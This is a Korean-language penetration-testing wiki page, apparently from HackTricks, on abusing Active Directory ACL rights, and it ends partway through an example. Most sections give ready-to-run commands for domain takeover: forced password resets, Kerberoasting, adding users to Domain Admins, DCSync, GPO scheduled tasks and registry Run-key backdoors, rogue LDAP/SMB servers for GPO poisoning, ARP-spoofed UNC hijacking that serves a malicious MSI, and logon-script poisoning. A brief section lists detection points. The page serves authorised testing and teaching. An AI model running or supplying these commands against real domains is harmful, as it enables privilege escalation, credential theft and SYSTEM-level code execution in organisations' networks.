# Active Directory ACL/ACE 악용

{{#include ../../../banners/hacktricks-training.md}}

**이 페이지는 주로 다음 기법을 요약합니다:** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **및** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**의 내용을 다룹니다. 자세한 내용은 원본 문서를 확인하세요.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **사용자에 대한 GenericAll 권한**

이 권한을 통해 공격자는 대상 사용자 계정을 완전히 제어할 수 있습니다. `Get-ObjectAcl` 명령으로 `GenericAll` 권한이 확인되면 공격자는 다음을 수행할 수 있습니다.

- **대상 사용자의 암호 변경**: `net user <username> <password> /domain`을 사용해 사용자의 암호를 재설정할 수 있습니다.
- Linux에서는 Samba `net rpc`를 사용해 SAMR을 통해 동일한 작업을 수행할 수 있습니다.<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **계정이 비활성화된 경우 UAC 플래그 제거**: `GenericAll`을 사용하면 `userAccountControl`을 수정할 수 있습니다. Linux에서 BloodyAD를 사용해 `ACCOUNTDISABLE` 플래그를 제거할 수 있습니다:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: 사용자의 계정에 SPN을 할당해 kerberoastable 상태로 만든 다음, Rubeus와 targetedKerberoast.py를 사용해 ticket-granting ticket (TGT) 해시를 추출하고 크래킹을 시도합니다.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: 사용자의 pre-authentication을 비활성화하여 계정이 ASREPRoasting에 취약해지도록 합니다.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: 사용자에게 `GenericAll` 권한이 있으면 인증서 기반 자격 증명을 추가하고 비밀번호를 변경하지 않고도 해당 사용자로 인증할 수 있습니다. 자세한 내용은 다음을 참조하세요.

{{#ref}}
shadow-credentials.md
{{#endref}}

## **그룹에 대한 GenericAll 권한**

이 권한이 있으면 공격자는 `Domain Admins`와 같은 그룹에 대해 `GenericAll` 권한을 사용해 그룹 멤버십을 조작할 수 있습니다. `Get-NetGroup`으로 그룹의 distinguished name을 확인한 후 공격자는 다음을 수행할 수 있습니다.

- **자신을 Domain Admins 그룹에 추가**: 직접 명령을 실행하거나 Active Directory 또는 PowerSploit과 같은 모듈을 사용해 추가할 수 있습니다.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Linux에서는 대상 그룹에 대한 GenericAll/Write 멤버십 권한이 있을 때 BloodyAD를 활용해 자신을 임의의 그룹에 추가할 수도 있습니다. 대상 그룹이 “Remote Management Users”에 중첩되어 있으면 해당 그룹을 적용하는 호스트에서 즉시 WinRM 액세스 권한을 얻습니다:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

컴퓨터 객체 또는 사용자 계정에 이러한 권한이 있으면 다음 작업을 수행할 수 있습니다.

- **Kerberos Resource-based Constrained Delegation**: 컴퓨터 객체를 탈취할 수 있습니다.
- **Shadow Credentials**: shadow credentials를 생성할 권한을 악용하여 컴퓨터 또는 사용자 계정을 사칭하는 기법입니다.

## **WriteProperty on Group**

사용자에게 특정 그룹(예: `Domain Admins`)의 모든 객체에 대한 `WriteProperty` 권한이 있으면 다음 작업을 수행할 수 있습니다.

- **Add Themselves to the Domain Admins Group**: `net user`와 `Add-NetGroupUser` 명령을 함께 사용하면 도메인 내에서 권한을 상승시킬 수 있습니다.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **그룹의 Self (Self-Membership)**

이 권한을 이용하면 공격자는 그룹 멤버십을 직접 조작하는 명령어를 통해 `Domain Admins`와 같은 특정 그룹에 자신을 추가할 수 있습니다. 다음 명령어를 순서대로 실행하면 자신을 그룹에 추가할 수 있습니다:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (자기 구성원 추가)**

이와 유사한 권한을 통해 공격자는 해당 그룹에 `WriteProperty` 권한이 있는 경우 그룹 속성을 수정하여 자신을 그룹에 직접 추가할 수 있습니다. 이 권한을 확인하고 실행하는 방법은 다음과 같습니다:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

사용자에 대해 `User-Force-Change-Password`의 `ExtendedRight`를 보유하면 현재 암호를 몰라도 암호를 재설정할 수 있습니다. 이 권한의 확인과 악용은 PowerShell 또는 대체 명령줄 도구를 통해 수행할 수 있으며, 대화형 세션과 비대화형 환경용 원라이너를 비롯해 사용자 암호를 재설정하는 여러 방법이 있습니다. 명령은 간단한 PowerShell 호출부터 Linux에서 `rpcclient`를 사용하는 방법까지 다양하며, 공격 벡터의 다재다능함을 보여 줍니다.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **그룹에 대한 WriteOwner**

공격자가 그룹에 대한 `WriteOwner` 권한을 가지고 있음을 발견하면, 그룹의 소유자를 자신으로 변경할 수 있습니다. 해당 그룹이 `Domain Admins`인 경우 그룹 속성과 멤버십을 더 폭넓게 제어할 수 있으므로 특히 큰 영향을 미칩니다. 이 과정에서는 `Get-ObjectAcl`을 사용해 올바른 객체를 식별한 다음, SID 또는 이름을 지정해 `Set-DomainObjectOwner`로 소유자를 변경합니다.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **사용자에 대한 GenericWrite**

이 권한으로 공격자는 사용자의 속성을 수정할 수 있습니다. 특히 `GenericWrite` 액세스 권한이 있으면 사용자가 로그온할 때 악성 스크립트가 실행되도록 로그온 스크립트 경로를 변경할 수 있습니다. 이를 위해 `Set-ADObject` 명령을 사용해 대상 사용자의 `scriptpath` 속성을 공격자의 스크립트 경로로 업데이트합니다.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

사용자의 [`scriptPath` attribute](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e)에 범위가 한정된 `WriteProperty` ACE만으로도 충분할 수 있습니다. `GenericWrite`는 필요하지 않습니다. 이 attribute 권한을 도메인의 `SYSVOL\<domain>\scripts` 또는 `NETLOGON` 트리 아래의 쓰기 가능한 script와 함께 사용한 다음, 대상 사용자가 로그온하여 해당 script에 도달할 가능성이 있는지 평가하세요. script는 로그온 시 해당 사용자의 컨텍스트에서 실행됩니다. 유효한 AD ACL과 파일/공유 ACL은 각각 별도로 검토하세요. 일치하는 Allow ACE나 쓰기 가능한 디렉터리만으로 전체 경로가 성립한다고 볼 수는 없습니다.

## **GenericWrite on Group**

이 권한이 있으면 공격자는 자신이나 다른 사용자를 특정 그룹에 추가하는 등 그룹 멤버십을 조작할 수 있습니다. 이 과정에는 credential object를 만들고, 이를 사용해 그룹에서 사용자를 추가하거나 제거한 다음, PowerShell 명령으로 멤버십 변경을 확인하는 작업이 포함됩니다.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Linux에서 그룹에 대한 `GenericWrite` 권한이 있으면 Samba `net`으로 구성원을 추가/제거할 수 있습니다 (PowerShell/RSAT를 사용할 수 없을 때 유용합니다):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

AD object의 소유권을 가지고 있고 해당 객체에 `WriteDACL` 권한이 있으면 공격자는 객체에 대한 `GenericAll` 권한을 자신에게 부여할 수 있습니다. 이는 ADSI 조작을 통해 수행되며, 객체를 완전히 제어하고 그룹 멤버십을 수정할 수 있게 됩니다. 하지만 Active Directory 모듈의 `Set-Acl` / `Get-Acl` cmdlet을 사용해 이러한 권한을 악용하려 할 때는 제한 사항이 있습니다.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL/WriteOwner 빠른 장악(PowerView)

사용자 또는 서비스 계정에 `WriteOwner` 및 `WriteDacl` 권한이 있으면, 기존 비밀번호를 몰라도 PowerView를 사용해 계정을 완전히 장악하고 비밀번호를 재설정할 수 있습니다:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

참고:
- `WriteOwner` 권한만 있다면 먼저 소유자를 자신으로 변경해야 할 수 있습니다:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- 비밀번호 재설정 후 모든 프로토콜(SMB/LDAP/RDP/WinRM)을 사용해 접근을 검증합니다.

## **도메인 복제 (DCSync)**

DCSync 공격은 도메인에 설정된 특정 복제 권한을 악용해 Domain Controller를 가장하고 사용자 자격 증명을 포함한 데이터를 동기화합니다. 이 강력한 기법을 사용하려면 `DS-Replication-Get-Changes`와 같은 권한이 필요합니다. 공격자는 이를 통해 Domain Controller에 직접 접근하지 않고도 AD 환경에서 민감한 정보를 추출할 수 있습니다.<sup>[[5]](#references)</sup> [**DCSync 공격에 대해 자세히 알아보세요.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects(GPO)를 관리하도록 위임된 접근 권한은 심각한 보안 위험을 초래할 수 있습니다. 예를 들어, `offense\spotless`와 같은 사용자에게 GPO 관리 권한이 위임된 경우 **WriteProperty**, **WriteDacl**, **WriteOwner**와 같은 권한을 보유할 수 있습니다. PowerView를 사용하면 이러한 권한이 악용될 수 있는지 확인할 수 있습니다: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO 권한 열거

잘못 구성된 GPO를 식별하려면 PowerSploit의 cmdlet을 연결해 사용할 수 있습니다. 이를 통해 특정 사용자가 관리 권한을 가진 GPO를 찾을 수 있습니다: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**특정 정책이 적용된 컴퓨터**: 특정 GPO가 적용되는 컴퓨터를 확인하면 잠재적 영향 범위를 파악하는 데 도움이 됩니다. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**특정 컴퓨터에 적용된 정책**: 특정 컴퓨터에 적용된 정책을 확인하려면 `Get-DomainGPO`와 같은 명령을 사용할 수 있습니다.

**특정 정책이 적용된 OU**: `Get-DomainOU`를 사용하면 특정 정책의 영향을 받는 조직 단위(OU)를 식별할 수 있습니다.

도구 [**GPOHound**](https://github.com/cogiceo/GPOHound)를 사용해 GPO를 열거하고 문제를 찾을 수도 있습니다.

### GPO 악용 - New-GPOImmediateTask

잘못 구성된 GPO를 악용해 코드를 실행할 수 있습니다. 예를 들어, 즉시 실행되는 예약 작업을 만들 수 있습니다. 이를 통해 영향을 받는 컴퓨터의 로컬 administrators 그룹에 사용자를 추가하여 권한을 크게 높일 수 있습니다:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

GroupPolicy module이 설치되어 있으면 새 GPO를 만들고 연결할 수 있으며, 영향을 받는 컴퓨터에서 backdoor를 실행하도록 레지스트리 값과 같은 설정을 지정할 수 있습니다. 이 방법을 사용하려면 GPO가 업데이트되고 사용자가 해당 컴퓨터에 로그인해야 실행됩니다:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - GPO 악용

SharpGPOAbuse는 새 GPO를 만들지 않고 기존 GPO에 작업을 추가하거나 설정을 수정해 악용하는 방법을 제공합니다. 이 도구를 사용하려면 기존 GPO를 수정하거나, 변경 사항을 적용하기 전에 RSAT 도구를 사용해 새 GPO를 만들어야 합니다:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### 정책 강제 업데이트

GPO는 일반적으로 약 90분마다 업데이트됩니다. 이 과정을 앞당기려면, 특히 변경 사항을 적용한 직후 대상 컴퓨터에서 `gpupdate /force` 명령을 실행해 정책을 즉시 업데이트할 수 있습니다. 이 명령을 사용하면 다음 자동 업데이트 주기를 기다리지 않고 GPO 변경 사항을 적용할 수 있습니다.

### 내부 동작

`Misconfigured Policy`와 같은 GPO의 Scheduled Tasks를 확인하면 `evilTask`와 같은 작업이 추가된 것을 확인할 수 있습니다. 이러한 작업은 시스템 동작을 변경하거나 권한을 상승시키기 위해 스크립트 또는 명령줄 도구를 통해 생성됩니다.

`New-GPOImmediateTask`로 생성된 XML 구성 파일에 나타난 작업 구조에는 실행할 명령과 트리거를 비롯한 예약된 작업의 세부 정보가 포함됩니다. 이 파일은 GPO에서 예약된 작업을 정의하고 관리하는 방식을 보여 주며, 정책 적용 과정에서 임의의 명령이나 스크립트를 실행하는 방법을 제공합니다.

### 사용자 및 그룹

GPO를 사용하면 대상 시스템의 사용자 및 그룹 멤버십도 조작할 수 있습니다. 공격자는 Users and Groups 정책 파일을 직접 편집해 사용자를 로컬 `administrators` 그룹과 같은 권한 있는 그룹에 추가할 수 있습니다. 이는 GPO 관리 권한 위임을 통해 가능하며, 이 권한으로 정책 파일을 수정해 새 사용자를 추가하거나 그룹 멤버십을 변경할 수 있습니다.

Users and Groups의 XML 구성 파일에는 이러한 변경을 적용하는 방법이 설명되어 있습니다. 이 파일에 항목을 추가하면 영향을 받는 시스템 전반에서 특정 사용자에게 높은 권한을 부여할 수 있습니다. 이 방법은 GPO 조작을 통해 권한을 직접 상승시키는 방법입니다.

로컬 그룹 멤버십 및 사용자 권한과 같은 보안 설정의 경우, 적용된 GPO 템플릿 `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf`와 `SecEdit` 디렉터리 ACL도 확인하세요. 쓰기 가능한 디렉터리나 파일은 검토할 단서일 뿐입니다. 실제로 변경 사항이 적용될 수 있는지는 SYSVOL 공유에 대한 유효 액세스 권한, 거부 및 상속된 ACL, Group Policy 컨테이너 권한, 정책 범위, 클라이언트 새로 고침 여부에 따라 달라집니다. “GPO Managers”라는 그룹의 멤버십만으로는 편집 권한이 입증되지 않습니다. [Microsoft는 이 템플릿 경로와 Group Policy 컨테이너/템플릿의 분리를 문서화하고 있습니다.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

또한 로그온/로그오프 스크립트 활용, autorun을 위한 레지스트리 키 수정, .msi 파일을 통한 소프트웨어 설치, 서비스 구성 편집 등 코드를 실행하거나 persistence를 유지하는 추가 방법도 고려할 수 있습니다. 이러한 기법은 GPO 악용을 통해 액세스를 유지하고 대상 시스템을 제어하는 여러 방법을 제공합니다.

### 인증된 rogue 서비스로 GPC/GPT 검색 리디렉션

GPO는 메타데이터가 포함된 LDAP **Group Policy Container (GPC)**와 정책 파일이 저장된 SMB 호스팅 **Group Policy Template (GPT)**으로 구성됩니다. 새로 고침 시 클라이언트는 컨테이너의 `gPLink`를 따라 참조된 GPC와 해당 `gPCFileSysPath`를 읽은 다음, 해당 UNC 경로에서 GPT를 다운로드합니다. 따라서 GPC 자체 또는 OU, Site, Domain의 `gPLink`에 대한 쓰기 권한을 악용해 권한이 있는 정책 처리를 유도할 수 있습니다.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### GPOddity를 이용한 `gPCFileSysPath` poisoning

제어하는 principal에 대상 GPC를 직접 수정하거나 **NTLM relay to LDAP**를 통해 수정할 권한이 있다면, `gPCFileSysPath`를 공격자가 호스팅하는 UNC 경로로 바꾸세요. [GPOddity](https://github.com/synacktiv/GPOddity)는 LDAP 변경을 자동화하고, 모듈 기반 정책 파일 또는 Group Policy 클라이언트가 `NT AUTHORITY\SYSTEM`으로 실행하는 Immediate Task가 포함된 악성 GPT를 제공합니다.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

현재 Windows 클라이언트에서는 익명 SMB 공유나 자격 증명과 무관한 SMB 공유만으로는 충분하지 않습니다. SMB Secure Negotiate는 인증이 성공했다는 증명을 요구하므로, rogue 서비스는 도메인 ID를 검증하고 SMB 세션 키를 파생한 뒤 응답에 올바르게 서명해야 합니다. embedded 모드에서는 제어하는 machine account와 해당 서비스 키로 GPOddity를 구성한 다음, `[COMMANDS]` 섹션에서 컴퓨터 또는 사용자 측 payload를 선택하세요.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**User GPO edge case:** MS16-072 이후에도 Windows는 **같은 TCP 연결에서** 두 개의 SMB2 세션을 생성합니다. user session은 `GPT.INI`를 읽고, 이어서 computer-account session은 `ScheduledTasks.xml`과 같은 유효 구성을 읽습니다. 따라서 rogue server는 인증 상태, 세션 키 및 서명 키를 소켓만으로가 아니라 SMB2 `SessionId`별로 인덱싱해야 합니다. GPOddity/OUned에 포함된 Scapy fork는 `SMBStreamSocketMultiplexing` 및 multiplexing을 지원하는 `SMBServer`를 통해 이를 구현합니다. 단일 세션만 지원하는 Impacket/Scapy 서버는 그렇지 않으면 잘못된 서명 상태를 재사용하여 user policy 처리에 실패합니다.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning with OUned

공격자가 OU, Site 또는 Domain에 대한 `WriteGPLink`, `GenericWrite` 또는 이에 준하는 제어 권한을 가진 경우, 공격자가 제어하는 LDAP 호스트가 제공하는 GPC DN을 가리키는 링크를 추가할 수 있습니다. 이 primitive는 Petros Koutroumpis가 처음 소개했으며, [OUned](https://github.com/synacktiv/OUned)는 LDAP 쓰기와 악성 GPC/GPT 체인을 자동화합니다.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

피해자는 먼저 rogue LDAP 서비스에 인증하고 `gPCFileSysPath`가 rogue SMB 서비스를 가리키는 GPC를 받습니다. 그런 다음 SMB에 인증하고 제공된 GPT를 적용합니다. 따라서 OUned에는 LDAP SPN이 있는 계정과 SMB용 HOST SPN이 있는 머신 계정(같은 머신 계정으로 둘 다 충족 가능), 그리고 포트 389와 445를 운영자 호스트로 보내는 DNS 확인 또는 역방향 포워딩이 필요합니다.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned의 내장 Scapy LDAP 서버는 실제 제어된 서비스 키로 Kerberos/SPNEGO를 검증하고 JSON에서 임의의 GPC 데이터를 제공합니다. 빈 JSON 키는 rootDSE를 나타내고, `base64:` 접두사는 바이너리 값을 나타냅니다. 또한 서버는 add/delete/modify/search와 `BASE`, `LEVEL`, `SUBTREE` 검색을 지원하며, 보호 없음, 무결성 또는 기밀성으로 협상할 수 있습니다. 따라서 다른 Windows 구성 요소가 공격자가 제어하는 LDAP 참조를 따르면서 인증된 LDAP를 요구하는 경우 이 서비스를 재사용할 수 있습니다.<sup>[[15]](#references)</sup>

계정 암호를 더미 도메인에 동기화하면 모든 Kerberos 키가 재현된다고 가정하지 마세요. RC4는 암호에서 파생되지만, AES string-to-key는 주체의 호스트 이름/도메인에서 파생된 salt도 사용합니다. 실제 계정 AES 키를 `KerberosSSP`에 제공하면 탐지 가능한 방식으로 시스템 계정이 자체적으로 쓰기 가능한 `msDS-SupportedEncryptionTypes`를 변경해 RC4를 강제할 필요가 없습니다.<sup>[[15]](#references)</sup>

#### 탐지 포인트

`gPCFileSysPath` 또는 `gPLink` 변경 사항을 GPO 버전 변경 및 새 Immediate/Scheduled Task XML과 연관 지어 확인하세요. 예상치 못한 네이밍 컨텍스트를 가리키는 링크, 승인된 DC/SYSVOL 범위 밖의 UNC 호스트, 컴퓨터 계정 이름을 리디렉션하는 DNS 레코드, 비정상적인 컴퓨터 계정의 LDAP/CIFS 서비스 티켓, RC4를 활성화하는 `msDS-SupportedEncryptionTypes` 변경 사항을 조사하세요.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

OU/도메인에 대한 `WriteGPLink` 권한이 있으면 대상 컨테이너의 `gPLink` 속성을 수정해 GPO 자체를 편집하지 않고도 **기존 GPO를 강제로 적용**할 수 있습니다. 연결된 GPO가 이미 **UNC 경로**(`\\HOST\share\...`)를 통해 원격 콘텐츠를 참조한다면 특히 유용합니다. 인증된 사용자는 **SYSVOL**을 읽을 수 있으므로 재사용 가능한 정책을 오프라인에서 탐색할 수 있습니다.<sup>[[11]](#references)</sup>

상위 수준의 작업 흐름:

1. BloodHound를 사용해 OU에 대한 `WriteGPLink` 권한이 있는 주체를 식별하고 해당 OU 안의 컴퓨터/사용자를 열거합니다.
2. `SYSVOL`을 읽기 전용으로 복제하고 GPO를 파싱해 UNC 경로를 참조하는 **Software Installation**, **드라이브 매핑**(`Drives.xml`), **로그온/시작 스크립트**를 찾습니다.
3. DFS/도메인 네임스페이스 경로 대신 **직접 호스트 이름**(예: `\\DC02\share\pkg.msi`)을 가리키는 정책을 우선 선택합니다. 호스트 이름 기반 경로는 L2 스푸핑으로 리디렉션하기 쉽기 때문입니다.
4. 선택한 GPO GUID를 대상 OU의 `gPLink`에 추가해 피해자가 이미 존재하는 해당 정책을 처리하도록 합니다.
5. 동일한 브로드캐스트 도메인에서 UNC 호스트를 ARP 스푸핑하고 해당 IP를 로컬에 바인딩해(`ip addr add <target_ip>/32 dev <iface>`) 피해자의 SMB 트래픽이 공격자 호스트로 오도록 합니다.
6. 공격자 SMB 서버(예: `smbserver.py`)에서 예상 경로/파일 이름을 제공하고 일반적인 정책 처리가 실행될 때까지 기다립니다.

`SYSVOL` 수집 및 GPO 연관 분석 예시:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

기존 GPO를 대상 OU에 연결합니다:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

연결된 GPO가 UNC 경로에서 MSI를 배포하는 경우, 클라이언트는 **컴퓨터 시작 시** 해당 파일을 가져와 **`NT AUTHORITY\SYSTEM`** 권한으로 설치합니다. 참조된 호스트를 스푸핑하고 **동일한 공유/경로/이름**으로 악성 MSI를 제공하면, **SYSVOL을 수정하지 않고도** `WriteGPLink`를 SYSTEM code execution으로 이어지게 할 수 있습니다.

중요한 제약 사항:

- **타이밍이 중요합니다**: 새 링크는 정책 새로 고침 시(일반적으로 약 90분 후) 반영되지만, **Software Installation**은 보통 **재부팅** 시 실행됩니다.
- Windows Installer는 일반적으로 배포 항목을 패키지 **`ProductCode`**로 추적합니다. 제품이 이미 설치되어 있으면 배포가 생략될 수 있습니다.
- 설치 프로그램이 거부하지 않도록, 악성 MSI를 패치해 **`ProductCode`**와 **`PackageCode`**를 GPO가 지정한 정상 패키지와 일치시킵니다.
- 이전 `.aas` 광고 파일이 `SYSVOL`에 남아 있을 수 있으므로, 이 방법에 의존하기 전에 배포가 여전히 활성 상태로 보이는지 확인합니다.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### 드라이브 매핑 UNC 하이재킹 -> NTLM 캡처 / WebDAV 릴레이

GPP 드라이브 매핑은 `Drives.xml`에 구성된 UNC 경로에 로그온 또는 재연결 시 사용자가 인증하도록 합니다. 참조된 호스트를 스푸핑하면 **NetNTLMv2**를 캡처할 수 있습니다. SMB가 의도적으로 실패하도록 하면 Windows가 **WebDAV**를 통해 재시도할 수 있으며, 이때 **HTTP를 통한 NTLM**이 전송됩니다. 이를 이용하면 **LDAP(S)**, **AD CS** 또는 **SMB**로 훨씬 유연하게 릴레이할 수 있습니다.

#### 로그온/시작 스크립트 UNC 하이재킹

`SYSVOL`에서 발견되는 UNC 호스팅 스크립트에도 같은 방식이 적용됩니다.

- **로그온 스크립트**는 일반적으로 **사용자** 컨텍스트에서 실행됩니다.
- **시작 스크립트**는 일반적으로 **컴퓨터 / SYSTEM** 컨텍스트에서 실행됩니다.

스크립트 경로가 스푸핑 가능한 호스트 이름을 가리키면 UNC 호스트를 리디렉션하고 예상 위치에서 대체 스크립트 콘텐츠를 제공할 수 있습니다.

## SYSVOL/NETLOGON 로그온 스크립트 포이즈닝

`\\<dc>\SYSVOL\<domain>\scripts\` 또는 `\\<dc>\NETLOGON\` 아래의 쓰기 가능한 경로를 이용하면 GPO를 통해 사용자 로그온 시 실행되는 로그온 스크립트를 변조할 수 있습니다. 이를 통해 로그인하는 사용자의 보안 컨텍스트에서 코드를 실행할 수 있습니다.

### 로그온 스크립트 찾기
- 구성된 로그온 스크립트가 있는지 사용자 속성을 확인합니다:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- 스크립트에 대한 바로 가기나 참조를 찾아내기 위해 도메인 공유 폴더를 크롤링합니다:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- `.lnk` 파일을 파싱해 SYSVOL/NETLOGON을 가리키는 대상 경로를 확인합니다 (유용한 DFIR 트릭이며, GPO에 직접 접근할 수 없는 공격자에게도 유용합니다):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
